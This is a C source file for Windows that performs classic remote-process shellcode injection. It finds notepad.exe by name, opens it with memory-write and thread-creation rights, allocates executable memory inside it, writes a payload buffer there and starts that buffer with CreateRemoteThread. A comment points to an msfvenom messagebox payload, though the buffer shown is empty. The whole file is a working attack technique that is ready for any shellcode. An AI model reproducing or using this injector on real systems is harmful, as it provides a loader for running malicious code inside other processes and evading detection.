#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>

// msfvenom -p windows/x64/messagebox TEXT="Hello hackers" -f C
unsigned char payload[] = {" "};

unsigned int payload_len = 320;


int FindTarget(const wchar_t* procname) {  // Note que a declaração agora espera uma string wide-char (Unicode)

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpiW(procname, pe32.szExeFile) == 0) {  // Use lstrcmpiW para comparação de string Unicode
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);

    return pid;
}


int Inject(HANDLE hProc, unsigned char* payload, unsigned int payload_len) {

    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;

    pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);

    // Corrigindo o tipo do argumento para CreateRemoteThread
    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL) {
        WaitForSingleObject(hThread, 500);
        CloseHandle(hThread);
        return 0;
    }
    return -1;
}

int main(void) {

    int pid = 0;
    HANDLE hProc = NULL;

    pid = FindTarget(L"notepad.exe");

    if (pid) {

        // Open the target process
        hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
            FALSE, (DWORD)pid);

        if (hProc != NULL) {
            Inject(hProc, payload, payload_len);
            CloseHandle(hProc);
        }
    }
    return 0;
}